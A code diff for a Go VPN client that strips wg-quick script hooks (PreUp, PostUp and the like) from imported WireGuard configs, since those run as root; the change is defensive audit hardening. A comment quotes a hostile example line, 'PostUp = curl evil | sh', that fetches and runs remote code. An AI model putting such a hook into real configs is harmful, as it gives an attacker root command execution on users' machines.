@@ -383,6 +383,37 @@ func (w *WireGuardProtocol) downUnix(ctx context.Context) error {
 	return nil
 }
 
+// stripWGScriptHooks removes any wg-quick script-hook directives
+// (PreUp/PostUp/PreDown/PostDown) from a WireGuard config. wg-quick runs these
+// as shell commands as ROOT, so an imported/untrusted .conf carrying e.g.
+// `PostUp = curl evil | sh` is a local root-RCE primitive. We strip them before
+// the config reaches the privileged helper; the app re-adds only its own
+// controlled bypass-route hooks afterwards. Match is on the directive key at
+// line start (case-insensitive) followed by '=' so legitimate keys are
+// untouched. Returns the cleaned config and the number of hook lines removed.
+func stripWGScriptHooks(content string) (string, int) {
+	hooks := []string{"preup", "postup", "predown", "postdown"}
+	lines := strings.Split(content, "\n")
+	out := make([]string, 0, len(lines))
+	removed := 0
+	for _, line := range lines {
+		lower := strings.ToLower(strings.TrimSpace(line))
+		isHook := false
+		for _, h := range hooks {
+			if strings.HasPrefix(lower, h) && strings.HasPrefix(strings.TrimSpace(lower[len(h):]), "=") {
+				isHook = true
+				break
+			}
+		}
+		if isHook {
+			removed++
+			continue
+		}
+		out = append(out, line)
+	}
+	return strings.Join(out, "\n"), removed
+}
+
 // buildWGConfigWithBypass reads the WireGuard config from src and returns the
 // content. On Linux/macOS it injects PostUp/PreDown endpoint bypass routes —
 // when AllowedIPs covers the VPN server's own IP, traffic to the server would
@@ -404,12 +435,24 @@ func buildWGConfigWithBypass(src string) (string, error) {
 		return "", err
 	}
 
-	// Windows: pass through unchanged.
-	if runtime.GOOS == "windows" {
-		return string(data), nil
+	// SECURITY (audit blocker #1): strip any caller-supplied wg-quick script
+	// hooks (PreUp/PostUp/PreDown/PostDown) before the config is ever handed to
+	// the privileged helper / wg-quick, which executes them as ROOT. Imported
+	// .conf files are untrusted (a malicious PostUp = arbitrary root command);
+	// only our own bypass-route hooks injected below may run. wg-quick is the
+	// only hook-executing path (the macOS in-process UAPI in wg_macos.go and the
+	// WireGuard Windows service ignore these directives) — but we strip on every
+	// path for defence in depth.
+	content, stripped := stripWGScriptHooks(string(data))
+	if stripped > 0 {
+		log.Printf("wg config: stripped %d caller-supplied script hook(s) (PreUp/PostUp/PreDown/PostDown) — not allowed from imported configs (root-exec risk)", stripped)
 	}
 
-	content := string(data)
+	// Windows: no app bypass routes needed (Wintun excludes the endpoint
+	// automatically); return the hook-stripped content as-is.
+	if runtime.GOOS == "windows" {
+		return content, nil
+	}
 
 	endpointIP, endpointIPv6 := parseEndpointIPs(content)
 
